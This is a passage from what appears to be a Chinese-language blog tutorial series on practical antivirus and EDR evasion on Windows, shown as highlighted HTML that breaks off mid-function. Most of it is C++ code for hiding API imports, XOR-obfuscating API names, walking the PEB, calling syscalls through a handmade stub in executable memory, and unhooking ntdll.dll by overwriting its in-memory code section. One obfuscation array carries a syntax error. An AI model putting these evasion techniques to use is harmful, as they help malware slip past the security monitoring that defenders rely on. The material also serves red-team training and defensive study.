class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 加载包含目标函数的DLL</span><br>    HMODULE hKernel32 = <span class="hljs-built_in">LoadLibraryA</span>(<span class="hljs-string">&quot;kernel32.dll&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!hKernel32) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;Failed to load kernel32.dll&quot;</span> &lt;&lt; std::endl;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 在运行时解析函数地址</span><br>    pVirtualAlloc myVirtualAlloc = (pVirtualAlloc)<span class="hljs-built_in">GetProcAddress</span>(hKernel32, <span class="hljs-string">&quot;VirtualAlloc&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!myVirtualAlloc) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;Failed to resolve VirtualAlloc&quot;</span> &lt;&lt; std::endl;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 动态调用API</span><br>    LPVOID mem = <span class="hljs-built_in">myVirtualAlloc</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-keyword">if</span> (mem) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;Memory allocated at: &quot;</span> &lt;&lt; mem &lt;&lt; std::endl;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>关键点：</strong> 二进制文件没有暴露<code>VirtualAlloc</code>到IAT中，这绕过了简单的静态分析。</p>
<hr>
<h3 id="2-4-3-–-使用字符串混淆隐藏API"><a href="#2-4-3-–-使用字符串混淆隐藏API" class="headerlink" title="2.4.3 – 使用字符串混淆隐藏API"></a><strong>2.4.3 – 使用字符串混淆隐藏API</strong></h3><p>为了使检测更加困难，可以对API名称和DLL名称进行混淆：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// XOR解码函数</span><br><span class="hljs-function">std::string <span class="hljs-title">xor_decode</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* enc, <span class="hljs-type">char</span> key)</span> </span>&#123;<br>    std::string out;<br>    <span class="hljs-keyword">while</span> (*enc) &#123;<br>        out += (*enc ^ key);<br>        enc++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> out;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">char</span> encDll[] = &#123; <span class="hljs-string">&#x27;k&#x27;</span> ^ <span class="hljs-number">0x2A</span>, <span class="hljs-string">&#x27;e&#x27;</span> ^ <span class="hljs-number">0x2A</span>, <span class="hljs-string">&#x27;r&#x27;</span> ^ <span class="hljs-number">0x2A</span>, <span class="hljs-string">&#x27;n&#x27;</span> ^ <span class="hljs-number">0x2A</span>, <span class="hljs-string">&#x27;e&#x27;</span> ^ <span class="hljs-number">0x2A</span>, <span class="hljs-string">&#x27;l&#x27;</span> ^ <span class="hljs-number">0x2A</span>, <span class="hljs-string">&#x27;3&#x27;</span> ^ <span class="hljs-number">0x2A</span>, <span class="hljs-string">&#x27;2&#x27;</span> ^ <span class="hljs-number">0x2A</span>, <span class="hljs-string">&#x27;.&#x27;</span>, ^ <span class="hljs-number">0x2A</span>, <span class="hljs-string">&#x27;d&#x27;</span> ^ <span class="hljs-number">0x2A</span>, <span class="hljs-string">&#x27;l&#x27;</span> ^ <span class="hljs-number">0x2A</span>, <span class="hljs-string">&#x27;l&#x27;</span> ^ <span class="hljs-number">0x2A</span>, <span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    <span class="hljs-type">char</span> encApi[] = &#123; <span class="hljs-string">&#x27;V&#x27;</span> ^ <span class="hljs-number">0x2A</span>, <span class="hljs-string">&#x27;i&#x27;</span> ^ <span class="hljs-number">0x2A</span>, <span class="hljs-string">&#x27;r&#x27;</span> ^ <span class="hljs-number">0x2A</span>, <span class="hljs-string">&#x27;t&#x27;</span> ^ <span class="hljs-number">0x2A</span>, <span class="hljs-string">&#x27;u&#x27;</span> ^ <span class="hljs-number">0x2A</span>, <span class="hljs-string">&#x27;a&#x27;</span> ^ <span class="hljs-number">0x2A</span>, <span class="hljs-string">&#x27;l&#x27;</span> ^ <span class="hljs-number">0x2A</span>, <span class="hljs-string">&#x27;A&#x27;</span> ^ <span class="hljs-number">0x2A</span>, <span class="hljs-string">&#x27;l&#x27;</span> ^ <span class="hljs-number">0x2A</span>, <span class="hljs-string">&#x27;l&#x27;</span> ^ <span class="hljs-number">0x2A</span>, <span class="hljs-string">&#x27;o&#x27;</span> ^ <span class="hljs-number">0x2A</span>, <span class="hljs-string">&#x27;c&#x27;</span> ^ <span class="hljs-number">0x2A</span>, <span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br><br>    std::string dll = <span class="hljs-built_in">xor_decode</span>(encDll, <span class="hljs-number">0x2A</span>);<br>    std::string api = <span class="hljs-built_in">xor_decode</span>(encApi, <span class="hljs-number">0x2A</span>);<br><br>    HMODULE hDll = <span class="hljs-built_in">LoadLibraryA</span>(dll.<span class="hljs-built_in">c_str</span>());<br>    FARPROC fn = <span class="hljs-built_in">GetProcAddress</span>(hDll, api.<span class="hljs-built_in">c_str</span>());<br>&#125;<br></code></pre></td></tr></table></figure>

<p>通过使用XOR编码混淆，API名称和DLL名称不再是明文，降低了被静态分析工具识别的可能性。</p>
<hr>
<h3 id="2-4-4-–-手动遍历PEB和导出表"><a href="#2-4-4-–-手动遍历PEB和导出表" class="headerlink" title="2.4.4 – 手动遍历PEB和导出表"></a><strong>2.4.4 – 手动遍历PEB和导出表</strong></h3><p>高级恶意软件通常通过直接从进程环境块（PEB）解析API，并解析已加载模块的导出表，避免使用<code>LoadLibrary</code>和<code>GetProcAddress</code>。</p>
<p>这种技术有助于规避用户空间钩取和未钩取的API访问。</p>
<h4 id="示例：从PEB手动解析GetProcAddress（简化版）"><a href="#示例：从PEB手动解析GetProcAddress（简化版）" class="headerlink" title="示例：从PEB手动解析GetProcAddress（简化版）"></a>示例：从PEB手动解析<code>GetProcAddress</code>（简化版）</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;winternl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">&quot;ntdll.lib&quot;</span>)</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_PEB_LDR_DATA</span> &#123;<br>    ULONG Length;<br>    BOOLEAN Initialized;<br>    PVOID SsHandle;<br>    LIST_ENTRY InLoadOrderModuleList;<br>&#125; PEB_LDR_DATA, *PPEB_LDR_DATA;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_LDR_DATA_TABLE_ENTRY</span> &#123;<br>    LIST_ENTRY InLoadOrderLinks;<br>    PVOID Reserved1[<span class="hljs-number">2</span>];<br>    PVOID DllBase;<br>    UNICODE_STRING FullDllName;<br>    UNICODE_STRING BaseDllName;<br>    <span class="hljs-comment">// ... 截断</span><br>&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    PPEB pPeb = (PPEB)__readgsqword(<span class="hljs-number">0x60</span>); <span class="hljs-comment">// PEB在x64架构下位于GS:[0x60]</span><br><br>    PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)pPeb-&gt;Ldr;<br>    LIST_ENTRY* pList = &amp;pLdr-&gt;InLoadOrderModuleList;<br><br>    LIST_ENTRY* pCurrent = pList-&gt;Flink;<br><br>    <span class="hljs-keyword">while</span> (pCurrent != pList) &#123;<br>        PLDR_DATA_TABLE_ENTRY pEntry = (PLDR_DATA_TABLE_ENTRY)pCurrent;<br><br>        std::wcout &lt;&lt; pEntry-&gt;BaseDllName.Buffer &lt;&lt; std::endl;<br><br>        pCurrent = pCurrent-&gt;Flink;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>通过手动遍历加载的模块（例如kernel32.dll）的基地址（<code>DllBase</code>），可以解析导出表，找到函数地址。</p>
<hr>
<h3 id="2-4-5-–-实际案例：SysWhispers"><a href="#2-4-5-–-实际案例：SysWhispers" class="headerlink" title="2.4.5 – 实际案例：SysWhispers"></a><strong>2.4.5 – 实际案例：SysWhispers</strong></h3><p><a target="_blank" rel="noopener" href="https://github.com/jthuraisamy/SysWhispers">SysWhispers</a>生成头文件和存根文件，允许你调用本地NT API，而不需要直接链接<code>ntdll.dll</code>。</p>
<p>这些API通过系统调用号（而不是名称）解析。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">NTSTATUS NTAPI <span class="hljs-title function_">NtAllocateVirtualMemory</span><span class="hljs-params">(...)</span>;<br></code></pre></td></tr></table></figure>

<p>这种方法完全绕过了用户模式钩取，避免了基于IAT解析的静态分析。</p>
<hr>
<h3 id="2-4-6-–-总结"><a href="#2-4-6-–-总结" class="headerlink" title="2.4.6 – 总结"></a><strong>2.4.6 – 总结</strong></h3><table>
<thead>
<tr>
<th>技术</th>
<th>绕过方式</th>
<th>使用场景</th>
</tr>
</thead>
<tbody><tr>
<td>GetProcAddress + LoadLibrary</td>
<td>静态IAT检查</td>
<td>基本的动态解析</td>
</tr>
<tr>
<td>混淆名称</td>
<td>字符串扫描引擎</td>
<td>隐藏明显的证据</td>
</tr>
<tr>
<td>PEB遍历</td>
<td>钩取的LoadLibrary &#x2F; 隐匿</td>
<td>自定义加载器、Shellcode等</td>
</tr>
<tr>
<td>手动解析导出表</td>
<td>用户空间API跟踪</td>
<td>无钩调用</td>
</tr>
<tr>
<td>SysWhispers&#x2F;仅系统调用API</td>
<td>完全绕过用户空间</td>
<td>红队和后渗透工具</td>
</tr>
</tbody></table>
<h2 id="AV-EDR规避实战技术-2-5-直接系统调用技术"><a href="#AV-EDR规避实战技术-2-5-直接系统调用技术" class="headerlink" title="AV&#x2F;EDR规避实战技术 - 2.5 - 直接系统调用技术"></a><strong>AV&#x2F;EDR规避实战技术 - 2.5 - 直接系统调用技术</strong></h2><p>传统的Windows API调用（如<code>VirtualAlloc</code>、<code>CreateThread</code>、<code>ReadProcessMemory</code>）是调用低级本地函数（位于<code>ntdll.dll</code>中）的包装器，这些低级函数通过系统调用（syscall）转换到内核模式。EDR常常在用户模式下钩取这些API级函数。</p>
<p>为了绕过这些钩取，恶意软件和红队工具通常会<strong>直接</strong>调用系统调用，避开API级别的检测。</p>
<hr>
<h3 id="2-5-1-–-什么是系统调用？"><a href="#2-5-1-–-什么是系统调用？" class="headerlink" title="2.5.1 – 什么是系统调用？"></a><strong>2.5.1 – 什么是系统调用？</strong></h3><p>系统调用（syscall）是<strong>用户模式</strong>与<strong>内核模式</strong>之间的接口。在Windows中，系统调用通过<code>ntdll.dll</code>访问，<code>ntdll.dll</code>提供了NT原生API，如：</p>
<ul>
<li><p><code>NtAllocateVirtualMemory</code></p>
</li>
<li><p><code>NtWriteVirtualMemory</code></p>
</li>
<li><p><code>NtCreateThreadEx</code></p>
</li>
</ul>
<p>这些函数通常不会像更高层的Win32 API那样被频繁钩取，直接调用这些系统调用可以绕过大多数EDR用户模式钩取。</p>
<hr>
<h3 id="2-5-2-–-ntdll-dll和系统调用存根的作用"><a href="#2-5-2-–-ntdll-dll和系统调用存根的作用" class="headerlink" title="2.5.2 – ntdll.dll和系统调用存根的作用"></a><strong>2.5.2 – <code>ntdll.dll</code>和系统调用存根的作用</strong></h3><p>当你调用像<code>VirtualAlloc</code>这样的Windows API时，它最终会调用<code>ntdll.dll</code>中的本地函数，如<code>NtAllocateVirtualMemory</code>，其汇编代码类似于：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">mov r10, rcx<br>mov eax, syscall_number<br>syscall<br>ret<br></code></pre></td></tr></table></figure>

<p>EDR常常会钩取这个存根函数。绕过这个存根意味着你需要直接调用<strong>自己的系统调用存根</strong>，而不依赖于<code>ntdll.dll</code>。</p>
<hr>
<h3 id="2-5-3-–-手动系统调用存根示例"><a href="#2-5-3-–-手动系统调用存根示例" class="headerlink" title="2.5.3 – 手动系统调用存根示例"></a><strong>2.5.3 – 手动系统调用存根示例</strong></h3><p>下面是一个简单的C&#x2F;C++示例，**手动调用<code>NtAllocateVirtualMemory</code>**，使用内联汇编绕过<code>ntdll.dll</code>：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(NTAPI* _NtAllocateVirtualMemory)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    HANDLE ProcessHandle,</span></span><br><span class="hljs-params"><span class="hljs-function">    PVOID* BaseAddress,</span></span><br><span class="hljs-params"><span class="hljs-function">    ULONG_PTR ZeroBits,</span></span><br><span class="hljs-params"><span class="hljs-function">    PSIZE_T RegionSize,</span></span><br><span class="hljs-params"><span class="hljs-function">    ULONG AllocationType,</span></span><br><span class="hljs-params"><span class="hljs-function">    ULONG Protect</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> syscall_stub[] = &#123;<br>    <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xD1</span>,             <span class="hljs-comment">// mov r10, rcx</span><br>    <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-comment">// mov eax, 0x18 (Syscall ID of NtAllocateVirtualMemory on specific builds)</span><br>    <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x05</span>,                   <span class="hljs-comment">// syscall</span><br>    <span class="hljs-number">0xC3</span>                          <span class="hljs-comment">// ret</span><br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    SIZE_T regionSize = <span class="hljs-number">0x1000</span>;<br>    PVOID baseAddress = <span class="hljs-literal">nullptr</span>;<br><br>    <span class="hljs-type">void</span>* exec = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-built_in">sizeof</span>(syscall_stub), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-built_in">memcpy</span>(exec, syscall_stub, <span class="hljs-built_in">sizeof</span>(syscall_stub));<br><br>    <span class="hljs-keyword">auto</span> sysNtAllocateVirtualMemory = (_NtAllocateVirtualMemory)exec;<br><br>    NTSTATUS status = <span class="hljs-built_in">sysNtAllocateVirtualMemory</span>(<br>        <span class="hljs-built_in">GetCurrentProcess</span>(),<br>        &amp;baseAddress,<br>        <span class="hljs-number">0</span>,<br>        &amp;regionSize,<br>        MEM_COMMIT | MEM_RESERVE,<br>        PAGE_EXECUTE_READWRITE<br>    );<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">NT_SUCCESS</span>(status)) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;Memory allocated at: &quot;</span> &lt;&lt; baseAddress &lt;&lt; std::endl;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;Syscall failed with status: &quot;</span> &lt;&lt; std::hex &lt;&lt; status &lt;&lt; std::endl;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<blockquote>
<p>⚠️ <code>eax</code>值（系统调用号）必须针对目标Windows版本设置正确。这些号在不同版本中<strong>会发生变化</strong>，因此大多数工具会动态解析这些号。</p>
</blockquote>
<hr>
<h3 id="2-5-4-–-使用系统调用规避的实际工具"><a href="#2-5-4-–-使用系统调用规避的实际工具" class="headerlink" title="2.5.4 – 使用系统调用规避的实际工具"></a><strong>2.5.4 – 使用系统调用规避的实际工具</strong></h3><ol>
<li><p><strong>SysWhispers &#x2F; SysWhispers2</strong></p>
<ul>
<li><p>动态生成<code>ntdll</code>本地函数的系统调用存根。</p>
</li>
<li><p>通过解析干净的<code>ntdll.dll</code>来解析正确的系统调用号。</p>
</li>
<li><p>通过正确的系统调用号直接执行系统调用，避免EDR钩取。</p>
</li>
</ul>
</li>
<li><p><strong>Hell’s Gate</strong></p>
<ul>
<li><p>读取内存中的<code>ntdll.dll</code>，动态查找和重建系统调用存根。</p>
</li>
<li><p>绕过<code>ntdll</code>中的内联钩取。</p>
</li>
</ul>
</li>
<li><p><strong>TartarusGate</strong></p>
<ul>
<li>实现系统调用重映射和变异，以迷惑行为分析模型。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="2-5-5-–-绕过用户模式API钩取：为何有效"><a href="#2-5-5-–-绕过用户模式API钩取：为何有效" class="headerlink" title="2.5.5 – 绕过用户模式API钩取：为何有效"></a><strong>2.5.5 – 绕过用户模式API钩取：为何有效</strong></h3><table>
<thead>
<tr>
<th>被钩取的API</th>
<th>EDR钩取？</th>
<th>是否可绕过？</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>VirtualAlloc</td>
<td>是</td>
<td>是</td>
<td>API级别，易检测</td>
</tr>
<tr>
<td>NtAllocateVirtualMemory</td>
<td>经常</td>
<td>是</td>
<td>经常被内联打补丁</td>
</tr>
<tr>
<td><strong>直接系统调用存根</strong></td>
<td>否</td>
<td>是</td>
<td>需要正确的系统调用号和存根</td>
</tr>
</tbody></table>
<p>通过复制并执行自己的系统调用存根，完全避开了以下两者：</p>
<ul>
<li><p>基于IAT的钩取。</p>
</li>
<li><p>在<code>ntdll.dll</code>中的内联打补丁检测。</p>
</li>
</ul>
<hr>
<h3 id="2-5-6-–-动态提取系统调用ID"><a href="#2-5-6-–-动态提取系统调用ID" class="headerlink" title="2.5.6 – 动态提取系统调用ID"></a><strong>2.5.6 – 动态提取系统调用ID</strong></h3><p>SysWhispers和Hell’s Gate扫描<code>ntdll.dll</code>的<code>.text</code>节来提取系统调用ID。</p>
<p>关键技术：</p>
<ul>
<li><p>从磁盘加载<code>ntdll.dll</code>。</p>
</li>
<li><p>解析PE头和<code>.text</code>节。</p>
</li>
<li><p>通过操作码模式识别系统调用存根。</p>
</li>
<li><p>从<code>mov eax, imm32</code>提取系统调用索引。</p>
</li>
</ul>
<p>这使得你的工具能够动态支持不同版本的Windows。</p>
<hr>
<h3 id="2-5-7-–-总结"><a href="#2-5-7-–-总结" class="headerlink" title="2.5.7 – 总结"></a><strong>2.5.7 – 总结</strong></h3><ul>
<li><p><strong>直接系统调用</strong>是绕过用户模式EDR钩取的最有效规避技术之一。</p>
</li>
<li><p>系统调用必须小心实现，确保：</p>
<ul>
<li><p>正确的系统调用号。</p>
</li>
<li><p>正确的函数原型。</p>
</li>
<li><p>按照内核预期传递参数。</p>
</li>
</ul>
</li>
<li><p>动态生成系统调用使得规避技术能够独立于版本进行操作。</p>
</li>
</ul>
<h2 id="AV-EDR规避实战技术-2-6-运行时卸载ntdll-dll钩取"><a href="#AV-EDR规避实战技术-2-6-运行时卸载ntdll-dll钩取" class="headerlink" title="AV&#x2F;EDR规避实战技术 - 2.6 - 运行时卸载ntdll.dll钩取"></a><strong>AV&#x2F;EDR规避实战技术 - 2.6 - 运行时卸载<code>ntdll.dll</code>钩取</strong></h2><p>现代的EDR经常使用<strong>内联钩取</strong>在<code>ntdll.dll</code>中监控关键的NT原生API调用，例如<code>NtAllocateVirtualMemory</code>、<code>NtProtectVirtualMemory</code>、<code>NtCreateThreadEx</code>等。这些钩取允许EDR在系统调用到达内核之前拦截并分析它们。</p>
<p>一个常见的规避技术是通过<strong>手动卸载</strong><code>ntdll.dll</code>：</p>
<ol>
<li><p>从磁盘加载一个<strong>干净的<code>ntdll.dll</code>副本</strong>。</p>
</li>
<li><p>用这个干净副本覆盖<strong>内存中的版本</strong>（仅覆盖<code>.text</code>节）。</p>
</li>
</ol>
<p>这样就移除了任何EDR安装的钩取，允许本地系统调用执行而不会被检测到。</p>
<hr>
<h3 id="2-6-1-–-手动卸载策略逐步说明"><a href="#2-6-1-–-手动卸载策略逐步说明" class="headerlink" title="2.6.1 – 手动卸载策略逐步说明"></a><strong>2.6.1 – 手动卸载策略逐步说明</strong></h3><ol>
<li><p>使用<code>CreateFile</code> + <code>CreateFileMapping</code> + <code>MapViewOfFile</code>加载干净的<code>ntdll.dll</code>副本。</p>
</li>
<li><p>解析PE结构以定位<code>.text</code>节。</p>
</li>
<li><p>使用<code>VirtualProtect</code>改变内存中<code>.text</code>节的保护。</p>
</li>
<li><p>用干净副本覆盖内存中的<code>.text</code>节。</p>
</li>
<li><p>恢复原始内存保护。</p>
</li>
</ol>
<hr>
<h3 id="2-6-2-–-完整代码示例：手动卸载ntdll-dll"><a href="#2-6-2-–-完整代码示例：手动卸载ntdll-dll" class="headerlink" title="2.6.2 – 完整代码示例：手动卸载ntdll.dll"></a><strong>2.6.2 – 完整代码示例：手动卸载<code>ntdll.dll</code></strong></h3><p>以下代码恢复原始的<code>ntdll.dll</code>的<code>.text</code>节，以击败用户模式EDR钩取：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;winnt.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">UnhookNtdll</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* ntdllPath = <span class="hljs-string">L&quot;C:\\Windows\\System32\\ntdll.dll&quot;</span>;<br><br>    <span class="hljs-comment">// 1. 打开干净的ntdll.dll副本</span><br>    HANDLE hFile = <span class="hljs-built_in">CreateFileW</span>(ntdllPath, GENERIC_READ, FILE_SHARE_READ, <span class="hljs-literal">nullptr</span>, OPEN_EXISTING, <span class="hljs-number">0</span>, <span class="hljs-literal">nullptr</span>);<br>    <span class="hljs-keyword">if</span> (hFile == INVALID_HANDLE_VALUE) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>    HANDLE hMapping = <span class="hljs-built_in">CreateFileMappingW</span>(hFile, <span class="hljs-literal">nullptr</span>, PAGE_READONLY | SEC_IMAGE, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">nullptr</span>);<br>    <span class="hljs-keyword">if</span> (!hMapping) &#123;<br>        <span class="hljs-built_in">CloseHandle</span>(hFile);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 2. 将干净副本映射到内存</span><br>    LPVOID cleanNtdll = <span class="hljs-built_in">MapViewOfFile</span>(hMapping, FILE_MAP_READ, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (!cleanNtdll) &#123;<br>        <span class="hljs-built_in">CloseHandle</span>(hMapping);<br>        <span class="hljs-built_in">CloseHandle</span>(hFile);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// 3. 在映射并加载的副本中定位`.text`节</span><br>    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)cleanNtdll;<br>    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)cleanNtdll + dosHeader-&gt;e_lfanew);<br>    PIMAGE_SECTION_HEADER section = <span class="hljs-built_in">IMAGE_FIRST_SECTION</span>(ntHeaders);<br><br>    LPVOID ntdllBase = <span class="hljs-built_in">GetModuleHandleW</span>(<span class="hljs-string">L&quot;ntdll.dll&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; ntHeaders-&gt;FileHeader.NumberOfSections; i++, section++) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">memcmp</span>(section-&gt;Name, <span class="hljs-string">&quot;.text&quot;</span>, <span class="hljs-number">5</span>) == <span class="hljs-number">0</span>) &#123;<br>            DWORD oldProtect;<br>            LPVOID pDest = (LPBYTE)ntdllBase + section-&gt;VirtualAddress;<br>            LPVOID pSrc = (LPBYTE)cleanNtdll + section-&gt;VirtualAddress;<br><br>            <span class="hljs-comment">// 4. 改变内存保护</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">VirtualProtect</span>(pDest, section-&gt;Misc.VirtualSize, PAGE_EXECUTE_READWRITE, 